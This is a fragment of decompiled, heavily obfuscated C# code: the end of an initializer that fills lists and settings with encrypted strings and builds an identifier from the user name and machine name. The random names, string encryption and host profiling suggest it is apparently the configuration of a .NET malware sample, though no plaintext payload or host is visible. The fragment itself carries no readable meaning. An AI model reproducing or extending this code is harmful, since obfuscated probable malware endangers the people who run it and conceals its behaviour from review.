			hNmpLWayyKYy(getString_0(107412459)),
			hNmpLWayyKYy(getString_0(107412414)),
			hNmpLWayyKYy(getString_0(107412353))
		};
		YlTzmyhpiwknfhq = new List<string>
		{
			hNmpLWayyKYy(getString_0(107411784)),
			hNmpLWayyKYy(getString_0(107411751)),
			hNmpLWayyKYy(getString_0(107411706)),
			hNmpLWayyKYy(getString_0(107411625)),
			hNmpLWayyKYy(getString_0(107411624)),
			hNmpLWayyKYy(getString_0(107412055)),
			hNmpLWayyKYy(getString_0(107412010)),
			hNmpLWayyKYy(getString_0(107411977)),
			hNmpLWayyKYy(getString_0(107411976)),
			hNmpLWayyKYy(getString_0(107411943)),
			hNmpLWayyKYy(getString_0(107411910)),
			hNmpLWayyKYy(getString_0(107411877)),
			hNmpLWayyKYy(getString_0(107411836)),
			hNmpLWayyKYy(getString_0(107411251)),
			hNmpLWayyKYy(getString_0(107411238)),
			hNmpLWayyKYy(getString_0(107411205)),
			hNmpLWayyKYy(getString_0(107411164)),
			hNmpLWayyKYy(getString_0(107411131)),
			hNmpLWayyKYy(getString_0(107411058)),
			hNmpLWayyKYy(getString_0(107411529)),
			hNmpLWayyKYy(getString_0(107411528)),
			hNmpLWayyKYy(getString_0(107411487)),
			hNmpLWayyKYy(getString_0(107411454)),
			hNmpLWayyKYy(getString_0(107411784)),
			hNmpLWayyKYy(getString_0(107411381)),
			hNmpLWayyKYy(getString_0(107411340)),
			hNmpLWayyKYy(getString_0(107411327)),
			hNmpLWayyKYy(getString_0(107410782)),
			hNmpLWayyKYy(getString_0(107410709)),
			hNmpLWayyKYy(getString_0(107410668)),
			hNmpLWayyKYy(getString_0(107410635)),
			hNmpLWayyKYy(getString_0(107410626)),
			hNmpLWayyKYy(getString_0(107410585)),
			hNmpLWayyKYy(getString_0(107411751)),
			hNmpLWayyKYy(getString_0(107411024)),
			hNmpLWayyKYy(getString_0(107411706)),
			hNmpLWayyKYy(getString_0(107410991)),
			hNmpLWayyKYy(getString_0(107410958)),
			hNmpLWayyKYy(getString_0(107410949)),
			hNmpLWayyKYy(getString_0(107410916)),
			hNmpLWayyKYy(getString_0(107410875)),
			hNmpLWayyKYy(getString_0(107410802)),
			hNmpLWayyKYy(getString_0(107410257)),
			hNmpLWayyKYy(getString_0(107410224)),
			hNmpLWayyKYy(getString_0(107410215)),
			hNmpLWayyKYy(getString_0(107410174)),
			hNmpLWayyKYy(getString_0(107410101))
		};
		zDTTWfcIAya = new List<string>
		{
			hNmpLWayyKYy(ouaHPvfKVdnz(getString_0(107410060))),
			hNmpLWayyKYy(getString_0(107410043)),
			hNmpLWayyKYy(getString_0(107410462)),
			hNmpLWayyKYy(getString_0(107410365)),
			hNmpLWayyKYy(getString_0(107409760)),
			hNmpLWayyKYy(getString_0(107409663)),
			hNmpLWayyKYy(getString_0(107409570)),
			hNmpLWayyKYy(getString_0(107409985)),
			hNmpLWayyKYy(getString_0(107409892)),
			hNmpLWayyKYy(getString_0(107409795)),
			hNmpLWayyKYy(getString_0(107409190)),
			hNmpLWayyKYy(getString_0(107409093)),
			hNmpLWayyKYy(getString_0(107409512)),
			hNmpLWayyKYy(ouaHPvfKVdnz(getString_0(107410060)))
		};
		FYfkyKTYUeI = hNmpLWayyKYy(getString_0(107409415));
		rUYXUMGWrLAx = new List<string>
		{
			hNmpLWayyKYy(getString_0(107409270)),
			hNmpLWayyKYy(getString_0(107408564)),
			hNmpLWayyKYy(getString_0(107408882)),
			hNmpLWayyKYy(getString_0(107408176)),
			hNmpLWayyKYy(getString_0(107407982)),
			hNmpLWayyKYy(getString_0(107408300))
		};
		tmofVFVJKbRY = new List<string>
		{
			hNmpLWayyKYy(getString_0(107407594)),
			hNmpLWayyKYy(getString_0(107407533)),
			hNmpLWayyKYy(getString_0(107407472))
		};
		MHekRYDPgvS = getString_0(107396421);
		wZVDIOgHreaG = getString_0(107396421);
		FhoQZCuugw = new DateTime(2000, 1, 1);
		cnzOdaYThekPAqQfq = new DateTime(2100, 1, 1);
		YNNeNxsxnCwT = getString_0(107396964);
		lgEGKUPjGpcc = getString_0(107390402);
		GyjdlyjfcEOXI = getString_0(107396421);
		cwjlAEBUmmgPcl = getString_0(107396421);
		LCiAwIOBLz = getString_0(107396421);
		coThoGGpnEMcnzu = getString_0(107396964);
		NQyfkhkCAdHiBh = getString_0(107396421);
		yXsKxXdmTMDNpi = getString_0(107396421);
		mvTZfeUAoYGCG = new List<string>
		{
			getString_0(107396486),
			getString_0(107396200),
			getString_0(107396520),
			getString_0(107396049)
		};
		RvOsVhMhBnkE = getString_0(107396421);
		WgsiGxlkcXCewl = getString_0(107407923);
		ybZhGjghWRSmuX = getString_0(107396421);
		tFfqxfbrSvYza = getString_0(107396421);
		HhsonkWVytgykO = getString_0(107396421);
		ZUmpRuBwYbxQ = string.Empty;
		XPTfyTotwfMK = getString_0(107396421);
		SspnFJsgjqAZV = getString_0(107396421);
		duEZpbNpcdRtQI = getString_0(107396421);
		PTCzeCuJCjetR = getString_0(107394035);
		erBYpyXGMnZKG = getString_0(107394035);
		aGfNoRGUNNAt = getString_0(107396421);
		tzUVFfNhnxlV = getString_0(107396964);
		LJtiQtEQkud = getString_0(107396421);
		PsPqDiPSbSOjtH = getString_0(107396421);
		HxHzgMFnFmlsE = getString_0(107396421);
		aRXDsVqHOBZWe = getString_0(107407918);
		hPhOROQxOBfQFczsT = getString_0(107396421);
		JLxpvIZTQHDy = getString_0(107396421);
		tHmQYSpikTiuXUcp = getString_0(107407933);
		VhcrQXrEyRMEqG = getString_0(107396421);
		QxtdOuqfCx = getString_0(107396421);
		jUSGzoxzYrHnqV = getString_0(107396421);
		yxYUzXQcSUSLG = getString_0(107396421);
		JXvIvRJSYKu = getString_0(107407912);
		hjNsvgTUNea = getString_0(107396964);
		HqdVGSzubAQV = getString_0(107396421);
		MLtgQsSXdeZzpG = getString_0(107396421);
		kskmTAbTAdUwgF = getString_0(107396421);
		fgyftAvJczBLO = new string[0];
		dYQrpOPXkxY = getString_0(107396421);
		ZzeIutOVdkVrn = true;
		WfmJqIEPUhuk = getString_0(107396421);
		fYzeXSQMFrly = false;
		boFOzmYvevA = false;
		jlfnbBYuNDzI = true;
		IhOmrQOWDLAAWCMJa = false;
		RztYwSIsnQJzs = getString_0(107407899);
		keaHDdagjiDMCTfH = false;
		VyJJdhwQUG = false;
		GvXCAEeKPgvgux = false;
		IqUPhqLWEelTFf = false;
		RySdpyQRxMNXcP = true;
		SXVCtbaEWR = getString_0(107407878) + Environment.UserName + getString_0(107407865) + Environment.MachineName + getString_0(107407844) + TvsCtQOAQyGAc.JdZrlYhckFAAOw() + getString_0(107407839);
		zfFucxqmGOlbbp = new List<string>();
		XugKJAihpC = new List<string>();
		FXXItJkGMyTzK = new List<string>();
	}
}
